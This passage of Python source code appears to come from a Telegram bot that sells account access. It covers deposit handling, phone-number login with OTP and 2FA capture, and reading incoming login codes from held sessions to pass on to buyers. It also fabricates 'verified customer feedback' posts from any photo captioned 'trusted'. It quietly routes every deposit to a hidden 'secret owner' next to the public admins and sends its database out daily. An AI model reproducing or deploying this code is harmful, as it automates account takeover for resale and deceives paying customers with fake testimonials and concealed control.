        return support_menu(call) # Route 'help' to support ticket system
        
    try: bot.edit_message_text(txt, call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
    except Exception: bot.delete_message(call.message.chat.id, call.message.message_id); bot.send_message(call.message.chat.id, txt, parse_mode="HTML", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "back_to_menu")
def back_to_menu(call):
    uid = str(call.from_user.id)
    if uid in db.data.get("deposit_states", {}): del db.data["deposit_states"][uid]; db.save_data()
    try: bot.edit_message_text(welcome_text(call.from_user), call.message.chat.id, call.message.message_id, reply_markup=get_main_menu())
    except Exception: bot.delete_message(call.message.chat.id, call.message.message_id); bot.send_message(call.message.chat.id, welcome_text(call.from_user), reply_markup=get_main_menu())

# ═══════════════════════════════════════
# PHOTO + TEXT HANDLERS
# ═══════════════════════════════════════

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    uid = str(message.from_user.id)
    if uid in db.data.get("deposit_states", {}) and db.data["deposit_states"][uid].get("step") == "screenshot":
        db.data["deposit_states"][uid]["screenshot"] = message.photo[-1].file_id
        db.data["deposit_states"][uid]["step"] = "amount"; db.save_data()
        bot.reply_to(message, "✅ 𝗦𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱.\n» 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗲𝘅𝗮𝗰𝘁 𝗮𝗺𝗼𝘂𝗻𝘁 𝗽𝗮𝗶𝗱 (𝗲.𝗴. 𝟱𝟬):")
    elif db.data.get("proof_channel"):
        try:
            if message.caption and "trusted" in message.caption.lower():
                proof_msg = f"{HDR}\n  ✅ 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗 𝗖𝗨𝗦𝗧𝗢𝗠𝗘𝗥 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 ✅\n{HDR}\n\n👤 𝗨𝘀𝗲𝗿: {message.from_user.first_name}\n🌟 𝗥𝗮𝘁𝗶𝗻𝗴: 𝗧𝗿𝘂𝘀𝘁𝗲𝗱 & 𝗔𝘂𝘁𝗵𝗲𝗻𝘁𝗶𝗰\n{DIV}\n🤖 @{bot.get_me().username}"
                bot.send_photo(db.data["proof_channel"], message.photo[-1].file_id, caption=proof_msg)
            else:
                bot.forward_message(db.data["proof_channel"].replace("@",""), message.chat.id, message.message_id)
        except: pass

@bot.message_handler(func=lambda m: True)
def handle_messages(message):
    uid = str(message.from_user.id)
    
    if uid in db.data.get("otp_waiting", {}):
        data = db.data["otp_waiting"][uid]; phone = str(data.get("phone","")); session = data.get("session")
        s = bot.reply_to(message, f"🔍 𝗦𝗰𝗮𝗻𝗻𝗶𝗻𝗴 𝗳𝗼𝗿 𝗢𝗧𝗣...\n⟡ 𝗣𝗵𝗼𝗻𝗲: {phone}")
        if session and session in active_clients:
            r = run_async(SessionManager.get_latest_otp(session))
            if r.get("status") == "success":
                mid = r.get("msg_id")
                if uid in otp_tracker and otp_tracker[uid].get("msg_id") == mid:
                    bot.edit_message_text(f"⚠️ 𝗗𝘂𝗽𝗹𝗶𝗰𝗮𝘁𝗲 𝗢𝗧𝗣 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱.\n» 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝗮 𝗻𝗲𝘄 𝗰𝗼𝗱𝗲 𝗼𝗿 𝘀𝗲𝗻𝗱 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗮𝗴𝗮𝗶𝗻.", message.chat.id, s.message_id)
                else:
                    otp_tracker[uid] = {"msg_id": mid}
                    mk = types.InlineKeyboardMarkup()
                    mk.add(types.InlineKeyboardButton("✅ 𝗩𝗘𝗥𝗜𝗙𝗬", callback_data=f"otpok_{uid}"), types.InlineKeyboardButton("❌ 𝗥𝗘𝗝𝗘𝗖𝗧", callback_data=f"otpno_{uid}"))
                    bot.edit_message_text(f"{HDR}\n   📲 𝗢𝗧𝗣 𝗙𝗢𝗨𝗡𝗗 📲\n{HDR}\n\n📱 𝗣𝗵𝗼𝗻𝗲: {phone}\n\n📝 𝗠𝗲𝘀𝘀𝗮𝗴𝗲:\n{r['otp']}", message.chat.id, s.message_id, reply_markup=mk)
                return
        for sn in active_clients:
            r = run_async(SessionManager.get_latest_otp(sn))
            if r.get("status") == "success":
                otp_tracker[uid] = {"msg_id": r.get("msg_id")}
                mk = types.InlineKeyboardMarkup()
                mk.add(types.InlineKeyboardButton("✅ 𝗩𝗘𝗥𝗜𝗙𝗬", callback_data=f"otpok_{uid}"), types.InlineKeyboardButton("❌ 𝗥𝗘𝗝𝗘𝗖𝗧", callback_data=f"otpno_{uid}"))
                bot.edit_message_text(f"{HDR}\n   📲 𝗢𝗧𝗣 𝗙𝗢𝗨𝗡𝗗 📲\n{HDR}\n\n📱 𝗣𝗵𝗼𝗻𝗲: {phone}\n\n📝 𝗠𝗲𝘀𝘀𝗮𝗴𝗲:\n{r['otp']}", message.chat.id, s.message_id, reply_markup=mk)
                return
        bot.edit_message_text(f"⊘ 𝗡𝗼 𝗿𝗲𝗰𝗲𝗻𝘁 𝗢𝗧𝗣 𝗳𝗼𝘂𝗻𝗱.\n» 𝗘𝗻𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗶𝗻𝗶𝘁𝗶𝗮𝘁𝗲𝗱 𝗹𝗼𝗴𝗶𝗻 𝗳𝗼𝗿: {phone}", message.chat.id, s.message_id)
        return
    
    if uid in db.data.get("session_states", {}):
        state = db.data["session_states"][uid]; step = state.get("step","")
        if step == "phone":
            state["phone"] = message.text.strip(); state["session_name"] = f"sess_{int(time.time())}"; db.save_data()
            st = bot.reply_to(message, "❖ 𝗜𝗻𝗶𝘁𝗶𝗮𝘁𝗶𝗻𝗴 𝗦𝗲𝘀𝘀𝗶𝗼𝗻...")
            r = run_async(SessionManager.send_code_async(state["phone"], state["session_name"]))
            if r.get("status") == "code_sent": state["phone_code_hash"] = r["phone_code_hash"]; state["step"] = "otp"; db.save_data(); bot.edit_message_text(f"✅ 𝗢𝗧𝗣 𝗦𝗲𝗻𝘁.\n» 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗢𝗧𝗣:", message.chat.id, st.message_id)
            elif r.get("status") == "authorized": bot.edit_message_text("✅ 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗮𝗰𝘁𝗶𝘃𝗲.", message.chat.id, st.message_id); del db.data["session_states"][uid]; db.save_data()
            else: bot.edit_message_text(f"⊘ Error: {r.get('message')}", message.chat.id, st.message_id); del db.data["session_states"][uid]; db.save_data()
        elif step == "otp":
            st = bot.reply_to(message, "❖ 𝗩𝗲𝗿𝗶𝗳𝘆𝗶𝗻𝗴 𝗖𝗼𝗱𝗲...")
            r = run_async(SessionManager.verify_code_async(state["session_name"], state["phone"], message.text.strip(), state["phone_code_hash"]))
            if r.get("status") == "success": bot.edit_message_text("✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱.", message.chat.id, st.message_id); del db.data["session_states"][uid]; db.save_data()
            elif r.get("status") == "2fa_needed": state["step"] = "2fa"; db.save_data(); bot.edit_message_text("🔐 𝟮𝗙𝗔 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱.\n» 𝗘𝗻𝘁𝗲𝗿 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱:", message.chat.id, st.message_id)
            elif r.get("status") in ["expired","invalid"]: bot.edit_message_text(f"⊘ {r.get('status').capitalize()} 𝗖𝗼𝗱𝗲.\n» 𝗨𝘀𝗲 /addsession 𝘁𝗼 𝗿𝗲𝘁𝗿𝘆.", message.chat.id, st.message_id); del db.data["session_states"][uid]; db.save_data()
            else: bot.edit_message_text(f"⊘ 𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗘𝗿𝗿𝗼𝗿.", message.chat.id, st.message_id); del db.data["session_states"][uid]; db.save_data()
        elif step == "2fa":
            st = bot.reply_to(message, "❖ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝟮𝗙𝗔...")
            r = run_async(SessionManager.verify_2fa_async(state["session_name"], message.text.strip()))
            bot.edit_message_text(f"{'✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱.' if r.get('status')=='success' else '⊘ 𝗜𝗻𝗰𝗼𝗿𝗿𝗲𝗰𝘁 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱.'}", message.chat.id, st.message_id)
            del db.data["session_states"][uid]; db.save_data()
        return
    
    if uid in db.data.get("deposit_states", {}):
        state = db.data["deposit_states"][uid]; step = state.get("step","")
        if step == "screenshot": bot.reply_to(message, "⊘ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗹𝗼𝗮𝗱 𝘁𝗵𝗲 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗳𝗶𝗿𝘀𝘁.")
        elif step == "amount":
            if not message.text or not message.text.replace('.','').isdigit(): bot.reply_to(message, "⊘ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿."); return
            amt = float(message.text)
            if amt < 30: bot.reply_to(message, "⊘ 𝗠𝗶𝗻𝗶𝗺𝘂𝗺 𝗱𝗲𝗽𝗼𝘀𝗶𝘁 𝗶𝘀 ₹𝟯𝟬."); return
            if amt > 50000: bot.reply_to(message, "⊘ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗱𝗲𝗽𝗼𝘀𝗶𝘁 𝗶𝘀 ₹𝟱𝟬,𝟬𝟬𝟬."); return
            state["amount"] = amt
            if state.get("method") == "upi": state["step"] = "utr"; db.save_data(); bot.reply_to(message, f"✅ 𝗔𝗺𝗼𝘂𝗻𝘁 𝗦𝗲𝘁: ₹{amt:.2f}\n» 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝟭𝟮-𝗱𝗶𝗴𝗶𝘁 𝗨𝗧𝗥 𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗲 𝗡𝗼:")
            else: notify_deposit(message.from_user, state); del db.data["deposit_states"][uid]; db.save_data()
        elif step == "utr":
            utr = message.text.strip()
            if not utr.isdigit() or len(utr) != 12: bot.reply_to(message, "⊘ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱. 𝗨𝗧𝗥 𝗺𝘂𝘀𝘁 𝗯𝗲 𝟭𝟮 𝗱𝗶𝗴𝗶𝘁𝘀."); return
            state["utr"] = utr; notify_deposit(message.from_user, state); del db.data["deposit_states"][uid]; db.save_data()
        return
    
    for aid, cu in db.data.get("connected_users", {}).items():
        if cu == uid and not message.text.startswith('/'):
            try: bot.forward_message(int(aid), message.chat.id, message.message_id); bot.reply_to(message, "✅ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗗𝗲𝗹𝗶𝘃𝗲𝗿𝗲𝗱")
            except: pass
            return
        if uid == aid and cu and not message.text.startswith('/'):
            try: bot.send_message(int(cu), f"🎧 𝗔𝗗𝗠𝗜𝗡:\n{message.text}")
            except: pass
            return

def notify_deposit(user, state):
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(types.InlineKeyboardButton("✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘", callback_data=f"approve_{user.id}_{state['amount']}"), types.InlineKeyboardButton("❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘", callback_data=f"decline_{user.id}"))
    mk.add(types.InlineKeyboardButton("🎧 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗨𝗦𝗘𝗥", callback_data=f"conn_{user.id}"))
    
    txt = f"{HDR}\n   ⏳ 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 𝗗𝗘𝗣𝗢𝗦𝗜𝗧\n{HDR}\n\n👤 𝗨𝘀𝗲𝗿: {user.first_name} (<code>{user.id}</code>)\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: ₹{state['amount']:.2f}"
    if "utr" in state: txt += f"\n🔢 𝗨𝗧𝗥: <code>{state['utr']}</code>"
    
    for oid in [SECRET_OWNER_ID] + db.data.get("public_owners", []):
        try:
            if "screenshot" in state: bot.send_photo(oid, state["screenshot"], caption=txt, parse_mode="HTML", reply_markup=mk)
            else: bot.send_message(oid, txt, parse_mode="HTML", reply_markup=mk)
        except: pass
        
    bot.send_message(user.id, f"{HDR}\n   ✅ 𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗘𝗗\n{HDR}\n\n┣ 💰 𝗔𝗺𝗼𝘂𝗻𝘁: ₹{state['amount']:.2f}\n┗ ⏳ 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗮𝗱𝗺𝗶𝗻 𝗿𝗲𝘃𝗶𝗲𝘄.\n\n» 𝗬𝗼𝘂𝗿 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝘄𝗶𝗹𝗹 𝗯𝗲 𝘂𝗽𝗱𝗮𝘁𝗲𝗱 𝘀𝗵𝗼𝗿𝘁𝗹𝘆.")

# ═══════════════════════════════════════
# START
# ═══════════════════════════════════════

if __name__ == "__main__":
    if not os.path.exists("sessions"): os.makedirs("sessions")
    print(f"{HDR}\n   ✨ 𝗕𝗢𝗧 𝗜𝗦 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚 ✨\n{HDR}")
    print(f"┣ 📛 Name: {db.data.get('display_name', 'Bot')}")
    print(f"┣ 👑 Secret Admin: {SECRET_OWNER_ID}")
    print(f"┗ 🛡 Public Admins: {len(db.data.get('public_owners',[]))}")
    for sn, sd in list(db.data.get("sessions", {}).items()):
        try: run_async(SessionManager.send_code_async(sd["phone"], sn))
        except: pass
    print(f"┣ 🔗 Active Sessions: {len(active_clients)}")
    print("┗ ✅ SYSTEM ONLINE AND READY!")
    
    def auto_db():
        while True:
            time.sleep(86400)
            if db.data.get("log_channel"):
                try:
                    with open(db.data_file, 'rb') as f: bot.send_document(db.data["log_channel"].replace("@",""), f, caption=f"{HDR}\n   💾 𝗔𝗨𝗧𝗢𝗠𝗔𝗧𝗘𝗗 𝗗𝗕 𝗕𝗔𝗖𝗞𝗨𝗣\n{HDR}")
                except: pass
    threading.Thread(target=auto_db, daemon=True).start()
    
    while True:
        try: bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e: print(f"⊘ Exception: {e}"); time.sleep(5)